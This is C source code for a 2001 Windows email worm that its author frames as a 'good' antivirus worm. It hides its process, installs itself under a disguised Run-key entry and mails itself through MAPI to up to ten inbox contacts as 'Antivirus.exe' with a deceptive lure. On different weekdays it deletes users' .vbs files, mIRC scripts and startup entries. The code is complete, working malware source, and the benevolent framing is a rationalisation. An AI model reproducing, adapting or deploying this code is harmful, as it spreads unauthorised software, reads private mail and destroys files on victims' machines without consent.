   /*
   I-Worm.Antivirus - The world's first 100% Antivirus worm
   Copyright (c) 2001 by aLL3gRo - Malaysia, 16 August 2001
   Compiled on Borland C++ v5.02
   OS Supported: Win9x/NT/2K

   Author's Notes:

   This is a "proof of concept" worm which demonstrates that not all viruses are bad.
   People always think that viruses and worms are bad and cause annoyance or damage.
   Now, this little creature here will illustrate to you the good purposes of a worm.
   This worm doesn't do damage. It's only purpose is to detect the presence of some known
   worms/trojans and remove them from the system i.e. this is an example of a "good"
   worm. I'm not sure if it works fine and stable coz I didn't do much testing.
   The worm uses MAPI to spread itself. The MAPI routine is almost similar to the one
   in I-Worm.Plage. This is because I've extracted the MAPI routine and modified it to
   fit into this little creature.
   When the worm is executed, it proceeds to install itself into the system as Setup30.exe
   and modifies system registry to load it on every Windows startup.
   The worm checks system date and takes actions based on the day of the week as below:

   Sunday  - Scans memory for the presence of I-Worm.Badtrans.
             If detected, unload them from memory and remove Badtrans from the system.
   Monday  - General routine: Restores HKEY_CLASSES_ROOT\exefile\shell\open\command
             to its original value "%1" %*. This would render some worms/trojans
             useless such as Pretty Park, Sircam, Subseven, Navidad etc..
             Also, worm erases whatever value in the Run and Load key in Win.ini
   Tuesday - Search for I-Worm.PrettyPark and tries to disinfect it from the system
   Wednesday - Search for mirc directory and deletes any script.ini file. This should
               eliminate most mirc worms.
   Thursday -  Search for Sircam worm and tries to remove it.
   Friday - General routine: Erases whatever value after the string Shell=Explorer.exe in
            System.ini.
   Saturday - Deletes all vbs files in Windows and Windows System directory. This should
              eliminate most vbs worms.

   When spreading via MAPI, the worm logons to default MAPI account, scans user inbox
   and replies to each e-mail with the worm attached. I've limit the worm to only send
   10 e-mails coz I don't wanna cause network congestion and clog down mail servers as
   in creating a denial of service.
   I had to compress the main executable using UPX v1.20 coz Borland C++ includes many
   runtime codes in its compiled executable.

   Special thanks to Bumblebee/29A for the MAPI routine from I-Worm.Plage

   */

   #include <windows.h>
   #include <mapi.h>
   #include <tlhelp32.h>
   #include <stdio.h>


   //All global variables
   char filename[100],nam[20];  //the worm's original filename
   char sysdir[100], windir[100],sysdr[100],windr[100];   //to get windows and system directory
   HANDLE chk;
   HKEY RunKey;
   WIN32_FIND_DATA wfd;
   SYSTEMTIME syst;
   OSVERSIONINFO osvi;
   HINSTANCE Mhwnd;
   LHANDLE session;
   MapiMessage *mess;
   char messId[512], fname[50],faddr[30];
   BYTE done[2];
   DWORD siz=sizeof(done);
   DWORD type=REG_SZ;
   PROCESSENTRY32 uProcess;
   HANDLE lSnapshot,myproc;
   BOOL rProcessFound;

   void General1();
   void General2();
   void vbsdel();
   void mirc();
   void Badtrans();
   void PPark();
   void Sircam();
   ULONG (PASCAL FAR *RegisterServiceProcess)(ULONG, ULONG);
   ULONG (PASCAL FAR *MSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
   ULONG (PASCAL FAR *MLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
   ULONG (PASCAL FAR *MLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
   ULONG (PASCAL FAR *MFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *MReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
   ULONG (PASCAL FAR *MFreeBuffer)(LPVOID);


   //Main Win32 entry point
   int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
   {
       register int county=0;

       HMODULE k32=GetModuleHandle("KERNEL32.DLL");
       if(k32) {
           (FARPROC &)RegisterServiceProcess=GetProcAddress(k32,"RegisterServiceProcess");
           if(RegisterServiceProcess)
            RegisterServiceProcess(NULL,1);
       }
       GetModuleFileName(hInst,filename,100);
       GetSystemDirectory((char *)sysdir,100);
       GetWindowsDirectory((char *)windir,100);
       strcpy(sysdr,sysdir);
       strcpy(windr,windir);
       strcat(sysdir,"\\Setup30.exe");
       CopyFile(filename,sysdir,FALSE);
       RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&RunKey);
       RegSetValueEx(RunKey, "Kernel Setup", 0, REG_SZ, (BYTE *)sysdir, 100);
       RegCloseKey(RunKey);
       Sleep(60000 * 5);
       GetSystemTime(&syst);
       if(syst.wDay==16 && syst.wMonth==9) {
         MessageBox(NULL,"System protected by I-Worm.Antivirus\nCopyright (c) 2001 by aLL3gRo","Antivirus",MB_OK|MB_ICONINFORMATION);
       }
       switch(syst.wDayOfWeek) {

       case 0:
           Badtrans();
           break;

       case 1:
           General1();
           break;

       case 2:
           PPark();
           break;

       case 3:
           mirc();
           break;

       case 4:
           Sircam();
           break;

       case 5:
           General2();
           break;

       case 6:
           vbsdel();

       }

       RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion",0,KEY_QUERY_VALUE,&RunKey);
       RegQueryValueEx(RunKey,"Install",0,&type,done,&siz);
       RegCloseKey(RunKey);

       if(strcmp(done,"1")!=0) {
         Mhwnd = LoadLibrary("MAPI32.DLL");
         (FARPROC &)MLogon=GetProcAddress(Mhwnd, "MAPILogon");
         (FARPROC &)MLogoff=GetProcAddress(Mhwnd, "MAPILogoff");
         (FARPROC &)MFindNext=GetProcAddress(Mhwnd, "MAPIFindNext");
         (FARPROC &)MReadMail=GetProcAddress(Mhwnd, "MAPIReadMail");
         (FARPROC &)MSendMail=GetProcAddress(Mhwnd, "MAPISendMail");
         (FARPROC &)MFreeBuffer=GetProcAddress(Mhwnd, "MAPIFreeBuffer");
         MLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&session);
         if(MFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
           do {
             if(MReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mess)==SUCCESS_SUCCESS) {
               if(county >= 10) {
                 break;
               }
               strcpy(fname,mess->lpOriginator->lpszName);
               strcpy(faddr,mess->lpOriginator->lpszAddress);
               mess->ulReserved=0;
               mess->lpszSubject="New antivirus tool";
               mess->lpszNoteText="Hey, checkout this new antivirus tool which checks your system for viruses";
               mess->lpszMessageType=NULL;
               mess->lpszDateReceived=NULL;
               mess->lpszConversationID=NULL;
               mess->flFlags=MAPI_SENT;
               mess->lpOriginator->ulReserved=0;
               mess->lpOriginator->ulRecipClass=MAPI_ORIG;
               mess->lpOriginator->lpszName=mess->lpRecips->lpszName;
               mess->lpOriginator->lpszAddress=mess->lpRecips->lpszAddress;
               mess->nRecipCount=1;
               mess->lpRecips->ulReserved=0;
               mess->lpRecips->ulRecipClass=MAPI_TO;
               mess->lpRecips->lpszName=fname;
               mess->lpRecips->lpszAddress=faddr;
               mess->nFileCount=1;
               mess->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
               memset(mess->lpFiles, 0, sizeof(MapiFileDesc));
               mess->lpFiles->ulReserved=0;
               mess->lpFiles->flFlags=NULL;
               mess->lpFiles->nPosition=-1;
               mess->lpFiles->lpszPathName=filename;
               mess->lpFiles->lpszFileName="Antivirus.exe";
               mess->lpFiles->lpFileType=NULL;
               MSendMail(session, NULL, mess, NULL, NULL);
               county++;
             }
           }while(MFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
           free(mess->lpFiles);
           MFreeBuffer(mess);
           MLogoff(session,0,0,0);
           FreeLibrary(Mhwnd);
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion",0,KEY_WRITE,&RunKey);
           RegSetValueEx(RunKey, "Install", 0, REG_SZ, "1",2);
           RegCloseKey(RunKey);
         }
       }
   }

   void General1()
   {
     RegOpenKeyEx(HKEY_CLASSES_ROOT,"exefile\\shell\\open\\command",0,KEY_WRITE,&RunKey);
     RegSetValueEx(RunKey, "", 0, REG_SZ, (BYTE *)"\"%1\" %*", 10);
     RegCloseKey(RunKey);
     WriteProfileString("Windows","Run","");
     WriteProfileString("Windows","Load","");
   }

   void General2()
   {
     strcat(windir,"\\System.ini");
     WritePrivateProfileString("boot","shell","",windir);
     WritePrivateProfileString("boot","shell","explorer.exe",windir);
   }

   void vbsdel()
   {
     register bool abc=TRUE;
     register HANDLE fhandle;

     strcat(sysdr,"\\*.vbs");
     fhandle=FindFirstFile(sysdr,&wfd);
     if(fhandle!=INVALID_HANDLE_VALUE) {
       while(abc) {
         DeleteFile(wfd.cFileName);
         abc=FindNextFile(fhandle,&wfd);
       }
     }
     FindClose(fhandle);
     abc=TRUE;
     strcat(windr,"\\*.vbs");
     fhandle=FindFirstFile(windr,&wfd);
     if(fhandle!=INVALID_HANDLE_VALUE) {
       while(abc) {
         DeleteFile(wfd.cFileName);
         abc=FindNextFile(fhandle,&wfd);
       }
     }
   }

   void mirc()
   {
     register HANDLE mirch;

     mirch=FindFirstFile("c:\\mirc\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\mirc\\script.ini");
     }
     mirch=FindFirstFile("c:\\mirc32\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\mirc32\\script.ini");
     }
     mirch=FindFirstFile("c:\\irc\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\irc\\script.ini");
     }
     mirch=FindFirstFile("c:\\chat\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\chat\\script.ini");
     }
     mirch=FindFirstFile("c:\\progra~1\\mirc\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\progra~1\\mirc\\script.ini");
     }
     mirch=FindFirstFile("c:\\progra~1\\mirc32\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\progra~1\\mirc32\\script.ini");
     }
     mirch=FindFirstFile("c:\\progra~1\\irc\\mirc.ini",&wfd);
     if(mirch!=INVALID_HANDLE_VALUE) {
       DeleteFile("c:\\progra~1\\irc\\script.ini");
     }
     FindClose(mirch);
   }

   void Badtrans()
   {
     register BOOL term;
     register char sys[100], win[100], ssys[100],says[100];

     lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     uProcess.dwSize=sizeof(uProcess);
     rProcessFound=Process32First(lSnapshot,&uProcess);
     while(rProcessFound) {
       if(strstr(uProcess.szExeFile,"INETD.EXE")!=NULL) {
         myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
         if(myproc!=NULL) {
           term=TerminateProcess(myproc,0);
         }
         CloseHandle(myproc);
       }
       if(strstr(uProcess.szExeFile,"KERN32.EXE")!=NULL) {
         myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
         if(myproc!=NULL) {
           term=TerminateProcess(myproc,0);
         }
         CloseHandle(myproc);
       }
       rProcessFound=Process32Next(lSnapshot,&uProcess);
     }
     CloseHandle(lSnapshot);
     memset(&osvi,0,sizeof(OSVERSIONINFO));
     osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
     GetVersionEx(&osvi);
     if (osvi.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS) {
       WriteProfileString("Windows","Run","");
     }
     else {
       RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",0,KEY_WRITE,&RunKey);
       RegDeleteValue(RunKey,"Run");
       RegCloseKey(RunKey);
     }
     RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",0,KEY_WRITE,&RunKey);
     RegDeleteValue(RunKey,"kernel32");
     RegCloseKey(RunKey);
     GetSystemDirectory((char *)sys,100);
     GetWindowsDirectory((char *)win,100);
     strcpy(ssys,sys);
     strcat(ssys,"\\hksdll.dll");
     strcat(sys,"\\KERN32.EXE");
     DeleteFile(ssys);
     DeleteFile(sys);
     strcpy(says,win);
     strcat(says,"\\hkk32.exe");
     strcat(win,"\\INETD.EXE");
     DeleteFile(win);
     DeleteFile(says);
     DeleteFile(win);
   }

   void PPark()
   {
     register BOOL term;
     register char sysy[100];

     RegOpenKeyEx(HKEY_CLASSES_ROOT,"exefile\\shell\\open\\command",0,KEY_WRITE,&RunKey);
     RegSetValueEx(RunKey, "", 0, REG_SZ, (BYTE *)"\"%1\" %*", 7);
     RegCloseKey(RunKey);
     lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     uProcess.dwSize=sizeof(uProcess);
     rProcessFound=Process32First(lSnapshot,&uProcess);
     while(rProcessFound) {
       if(strstr(uProcess.szExeFile,"FILES32.VXD")!=NULL) {
         myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
         if(myproc!=NULL) {
           term=TerminateProcess(myproc,0);
         }
         CloseHandle(myproc);
       }
       rProcessFound=Process32Next(lSnapshot,&uProcess);
     }
     CloseHandle(lSnapshot);
     Sleep(500);
     GetSystemDirectory((char *)sysy,100);
     strcat(sysy,"\\FILES32.VXD");
     DeleteFile(sysy);
   }

   void Sircam()
   {
     register HANDLE sirc;
     register char sysyt[100],aut[100];
     register FILE *ab;

     RegOpenKeyEx(HKEY_CLASSES_ROOT,"exefile\\shell\\open\\command",0,KEY_WRITE,&RunKey);
     RegSetValueEx(RunKey, "", 0, REG_SZ, (BYTE *)"\"%1\" %*", 7);
     RegCloseKey(RunKey);
     GetSystemDirectory((char *)sysyt,100);
     strcat(sysyt,"\\Scam32.exe");
     sirc=FindFirstFile(sysyt,&wfd);
     if(sirc!=INVALID_HANDLE_VALUE) {
       SetFileAttributes(sysyt,FILE_ATTRIBUTE_NORMAL);
       SetFileAttributes("c:\\Autoexec.bat",FILE_ATTRIBUTE_NORMAL);
       ab=fopen("c:\\Autoexec.bat","a+");
       strcpy(aut,"\n@if exist ");
       strcat(aut,sysyt);
       strcat(aut," del ");
       strcat(aut,sysyt);
       fprintf(ab,aut);
       fprintf(ab,"\nattrib -r -h -s c:\\recycled\\*.*");
       fprintf(ab,"\ndel c:\\recycled\\Sirc32.exe");
       fclose(ab);
     }

   }
